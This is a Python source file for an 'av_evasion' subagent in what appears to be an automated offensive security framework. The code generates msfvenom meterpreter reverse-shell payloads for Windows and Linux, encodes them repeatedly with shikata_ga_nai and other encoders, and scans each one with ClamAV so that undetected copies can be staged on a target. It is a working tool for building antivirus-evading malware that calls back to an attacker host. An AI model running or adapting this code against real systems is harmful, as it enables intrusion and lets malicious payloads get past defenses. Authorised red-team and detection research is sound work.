"""
av_evasion_subagent.py - AV/EDR evasion payload generation + testing.

AGENT_NAME   : "evasion"
SUBAGENT_NAME: "av_evasion"

What it does
------------
Generates encoded / obfuscated payloads (msfvenom + encoder ladders)
and tests them against the host's resident AV (Defender on Windows,
ClamAV on Linux).  Reports which encoder + iteration count produced a
payload that survived the on-disk scan.

Security note
-------------
All subprocess invocations use asyncio.create_subprocess_exec with
positional argv (the safe execFile-equivalent form).  No shell is
invoked; user-controllable values like LHOST/LPORT flow as discrete
argv tokens and cannot be interpreted as shell commands.

Note on history
---------------
This subagent was referenced from agents/evasion/evasion_agent.py and
the agent_server subagent registry but the file itself was missing
from disk - which would have caused ImportError the moment the
evasion phase fired.  This file restores the missing implementation.
"""
from __future__ import annotations

import asyncio
import logging
import os
import shutil
import time
from typing import Any, List, Tuple

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)


# Tunables (env-overridable)
AV_LOOT_DIR        = os.environ.get("AV_LOOT_DIR", "/tmp/argus-av")
AV_PAYLOAD_TIMEOUT = int(os.environ.get("AV_PAYLOAD_TIMEOUT", "60"))
AV_SCAN_TIMEOUT    = int(os.environ.get("AV_SCAN_TIMEOUT",    "60"))

# Linux encoder ladder.  Each tuple: (encoder, iterations).
_LINUX_ENCODERS = [
    ("shikata_ga_nai",          5),
    ("shikata_ga_nai",         10),
    ("x86/jmp_call_additive",   3),
]
# Windows encoder ladder.
_WIN_ENCODERS = [
    ("x86/shikata_ga_nai", 10),
    ("x64/zutto_dekiru",    5),
    ("x86/countdown",       3),
]


class AvEvasionSubagent(BaseSubagent):
    """Generate evasion payloads + verify against resident AV."""

    AGENT_NAME    = "evasion"
    SUBAGENT_NAME = "av_evasion"

    async def run(self, target: str, **kwargs: Any) -> SubagentResult:    # noqa: C901
        result = SubagentResult(
            session_id    = self.session_id,
            subagent_name = self.SUBAGENT_NAME,
            target        = target,
        )
        start = time.monotonic()
        os_type: str = str(kwargs.get("os_type") or "linux").lower()
        lhost:   str = str(kwargs.get("lhost") or "LHOST")
        lport:   int = int(kwargs.get("lport") or 4444)

        if not shutil.which("msfvenom"):
            result.notes = ("msfvenom not on PATH; av_evasion skipped. "
                            "Install: apt install metasploit-framework")
            result.duration_sec = time.monotonic() - start
            return result

        os.makedirs(AV_LOOT_DIR, exist_ok=True)

        # 1. Posture check for context
        await self._defender_status(target, os_type)

        # 2. Generate encoded payloads + test against local AV
        if os_type == "windows":
            encoders   = _WIN_ENCODERS
            payload_id = "windows/x64/meterpreter/reverse_tcp"
            fmt        = "exe"
        else:
            encoders   = _LINUX_ENCODERS
            payload_id = "linux/x64/meterpreter/reverse_tcp"
            fmt        = "elf"

        survivors: List[dict] = []
        for encoder, iters in encoders:
            out_path = os.path.join(
                AV_LOOT_DIR,
                f"payload-{os_type}-{encoder.replace('/', '_')}-i{iters}.{fmt}",
            )
            argv = [
                "msfvenom",
                "-p", payload_id,
                f"LHOST={lhost}", f"LPORT={lport}",
                "-e", encoder,
                "-i", str(iters),
                "-f", fmt,
                "-o", out_path,
            ]
            ok, scan_label = await self._generate_and_scan(argv, out_path)
            if ok:
                survivors.append({
                    "encoder":    encoder,
                    "iterations": iters,
                    "path":       out_path,
                    "scan":       scan_label,
                })
                await self.store_finding(Finding(
                    title       = f"AV-evading payload generated: {encoder} x{iters}",
                    description = (f"Payload {payload_id} encoded with {encoder} "
                                   f"({iters} iter) survived local scan. "
                                   f"File: {out_path}.  LHOST={lhost} LPORT={lport}."),
                    severity    = "MEDIUM",
                    evidence    = f"path={out_path} scan={scan_label}",
                    tool        = "msfvenom",
                    host        = target,
                    mitre_technique    = "T1027",
                    exploit_suggestion = "Stage on target via established shell + verify callback.",
                ))

        if not survivors:
            await self.store_finding(Finding(
                title       = "All encoder/iteration combinations flagged by local AV",
                description = ("No standard msfvenom encoder produced a payload "
                               "that survived the host's resident AV.  Switch "
                               "to a custom loader (Donut+PIC, Sharpshooter, "
                               "Sliver) or pivot to a non-AV-protected surface."),
                severity    = "INFO",
                tool        = "msfvenom",
                host        = target,
                mitre_technique = "T1027",
            ))

        result.notes = (f"survivors={len(survivors)}/{len(encoders)}; "
                        f"os_type={os_type}")
        result.duration_sec = time.monotonic() - start
        return result

    # ── Helpers ──────────────────────────────────────────────────────

    async def _defender_status(self, target: str, os_type: str) -> None:
        try:
            if os_type == "windows":
                out = await self.collect_tool(
                    "powershell", target,
                    {"options": ("-Command \"Get-MpComputerStatus | "
                                 "Select-Object AMSIEnabled,AntivirusEnabled,"
                                 "RealTimeProtectionEnabled | Format-List\" 2>&1")},
                )
                if out and "True" in out:
                    await self.store_finding(Finding(
                        title       = "Windows Defender active on target",
                        description = "Real-time protection + AMSI enabled. "
                                      "Payloads need encoding/obfuscation to land.",
                        severity    = "INFO",
                        evidence    = out[:400],
                        tool        = "powershell",
                        host        = target,
                        mitre_technique = "T1562.001",
                    ))
            else:
                if shutil.which("clamscan"):
                    await self.store_finding(Finding(
                        title       = "ClamAV present on operator host",
                        description = "Will be used to local-test generated "
                                      "payloads before staging on target.",
                        severity    = "INFO",
                        tool        = "clamav",
                        host        = target,
                    ))
        except Exception as exc:
            logger.debug("[av_evasion] defender_status: %s", exc)

    async def _generate_and_scan(self, argv: List[str], out_path: str
                                 ) -> Tuple[bool, str]:
        # Generate via positional argv (no shell)
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                start_new_session=True,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=AV_PAYLOAD_TIMEOUT,
            )
            if proc.returncode != 0 or not os.path.isfile(out_path):
                logger.debug("[av_evasion] msfvenom exit=%s, present=%s",
                             proc.returncode, os.path.isfile(out_path))
                return False, "msfvenom_failed"
        except Exception as exc:
            logger.debug("[av_evasion] msfvenom error: %s", exc)
            return False, f"error:{exc}"

        # Scan (LOCAL only)
        try:
            scanner = shutil.which("clamscan")
            if scanner:
                proc = await asyncio.create_subprocess_exec(
                    scanner, "--quiet", "--infected", out_path,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    start_new_session=True,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=AV_SCAN_TIMEOUT,
                )
                detected = b"FOUND" in stdout
                return (not detected,
                        "clamav_clean" if not detected else "clamav_detected")
            return True, "no_scanner"
        except Exception as exc:
            logger.debug("[av_evasion] scan error: %s", exc)
            return True, "scan_error"


__all__ = ["AvEvasionSubagent"]
